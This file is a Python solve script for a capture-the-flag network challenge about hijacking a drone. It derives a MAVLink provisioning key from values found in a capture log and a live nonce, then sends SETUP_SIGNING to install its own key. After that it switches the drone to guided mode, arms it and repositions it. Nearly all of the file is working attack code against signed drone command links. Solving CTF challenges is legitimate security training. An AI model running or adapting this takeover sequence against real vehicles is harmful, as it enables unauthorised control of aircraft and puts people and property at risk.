#!/usr/bin/env python3
"""
grid-watch (CSCTF 2026 - Network).

Vultur Dynamics drones take MAVLink 2 orders over a *signed* link. Unsigned and
replayed commands are refused. To make the drone accept our own reposition we
re-provision the signing key in the field with a SETUP_SIGNING authenticated by
the unit's provisioning key, then fly it.

Key recovery (all from the supplied files):
  * serial          = "CX-FALCON-9951"         (from a STATUSTEXT in capture.tlog)
  * commissioning   = 1733965123 seconds       (calibrated below from the capture)
      Each signed frame carries a 48-bit RTC tick (10 us units since the commissioning
      epoch) in its signing trailer. capture.tlog pairs those ticks with wall-clock
      times; an EXACT two-point line (not float least-squares, which loses precision
      on ~2.3e12 ticks) gives epoch = wall - slope*tick ~= 1733965123, ppm ~= -17.
  * prov_key = HKDF-SHA256(ikm = serial || epoch(uint64 LE),
                           salt = the per-connect nonce (raw bytes),
                           info = "CX-PROV/v1", L = 32)         (nonce from "PROV NONCE")

Then, in ONE connection: read the nonce + a live tick, derive prov_key, send a
SETUP_SIGNING (signed with prov_key) installing our own key, switch to it, and
issue DO_SET_MODE GUIDED(4) -> COMPONENT_ARM_DISARM -> DO_REPOSITION (as a
COMMAND_LONG; the drone rejects COMMAND_INT / SET_POSITION_TARGET). The accepted
reposition returns the flag over STATUSTEXT.

Requires pymavlink. HOST is per-launch (the event instance), e.g. w01.ctf.chronos-security.ro:37370.
"""
import sys, time, hmac, hashlib
from fractions import Fraction

TLOG = "capture.tlog"
HOST = sys.argv[1] if len(sys.argv) > 1 else "tcp:w01.ctf.chronos-security.ro:37370"
SERIAL = b"CX-FALCON-9951"
INFO = b"CX-PROV/v1"
MARGIN = 300000                                   # ticks to stay ahead of the drone clock


def hkdf(ikm, salt, info, L=32):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    out, t, i = b"", b"", 1
    while len(out) < L:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        out += t; i += 1
    return out[:L]


def commissioning_epoch(path):
    """Exact-arithmetic calibration of the commissioning epoch from the capture."""
    from pymavlink import mavutil
    m = mavutil.mavlink_connection(path)
    pts = []
    while True:
        msg = m.recv_match(blocking=False)
        if msg is None:
            break
        b = msg.get_msgbuf(); t = getattr(m, "_timestamp", 0)
        if len(b) > 2 and b[0] == 0xFD and (b[2] & 1):          # signed MAVLink2 frame
            pts.append((t, int.from_bytes(b[-13:][1:7], "little")))
    (w0, k0), (w1, k1) = pts[0], pts[-1]
    slope = Fraction(int(w1 * 1_000_000) - int(w0 * 1_000_000), k1 - k0) / 1_000_000
    epoch = Fraction(int(w0 * 1_000_000), 1_000_000) - slope * k0
    return round(float(epoch))


def main():
    from pymavlink import mavutil
    from pymavlink.dialects.v20 import common as mav

    epoch = commissioning_epoch(TLOG)
    print("commissioning epoch =", epoch)
    # RFC 5869 self-check on the HKDF
    assert hkdf(bytes.fromhex("0b" * 22), bytes.fromhex("000102030405060708090a0b0c"),
                bytes.fromhex("f0f1f2f3f4f5f6f7f8f9"), 42).hex().startswith("3cb25f25faacd57a90434f64")

    m = mavutil.mavlink_connection(HOST, source_system=255, source_component=190)
    tx = mav.MAVLink(None, srcSystem=255, srcComponent=190)      # outgoing, we add signing
    rx = mav.MAVLink(None); rx.robust_parsing = True            # incoming WITHOUT sig check
    tick = [0]; last = [0]; nonce = [None]

    def note(msg):
        b = msg.get_msgbuf()
        if len(b) > 2 and b[0] == 0xFD and (b[2] & 1):
            tick[0] = max(tick[0], int.from_bytes(b[-13:][1:7], "little"))

    def ts():
        v = max(last[0] + 1000, tick[0] + MARGIN); last[0] = v; tx.signing.timestamp = v; return v

    def send(msg):
        ts(); m.write(msg.pack(tx))

    def pump(secs, tag):
        t0 = time.time()
        while time.time() - t0 < secs:
            data = m.recv()
            if not data:
                time.sleep(0.03); continue
            for msg in rx.parse_buffer(data) or []:
                note(msg)
                if msg.get_type() == "STATUSTEXT":
                    print("  [%s] %s" % (tag, msg.text))
                    if "NONCE" in msg.text:
                        nonce[0] = msg.text.split()[-1]
                    if "CSCTF{" in msg.text:
                        print("\n*** FLAG:", msg.text)

    t0 = time.time()                                           # read the hello (nonce + a live tick)
    while time.time() - t0 < 15 and (nonce[0] is None or tick[0] == 0):
        data = m.recv()
        if not data:
            time.sleep(0.03); continue
        for msg in rx.parse_buffer(data) or []:
            note(msg)
            if msg.get_type() == "STATUSTEXT" and "NONCE" in msg.text:
                nonce[0] = msg.text.split()[-1]

    prov = hkdf(SERIAL + epoch.to_bytes(8, "little"), bytes.fromhex(nonce[0]), INFO)
    newkey = bytes(range(32))
    tx.signing.secret_key = prov; tx.signing.sign_outgoing = True; tx.signing.link_id = 0
    send(tx.setup_signing_encode(1, 1, newkey, ts())); pump(3, "setup")     # install our key
    tx.signing.secret_key = newkey                                           # sign with it now
    send(tx.command_long_encode(1, 1, mav.MAV_CMD_DO_SET_MODE, 0,
                                mav.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 4, 0, 0, 0, 0, 0)); pump(3, "guided")
    send(tx.command_long_encode(1, 1, mav.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)); pump(3, "arm")
    send(tx.command_long_encode(1, 1, mav.MAV_CMD_DO_REPOSITION, 0, -1, 0, 0, float("nan"),
                                45.6, 24.1, 60.0)); pump(8, "reposition")


if __name__ == "__main__":
    main()
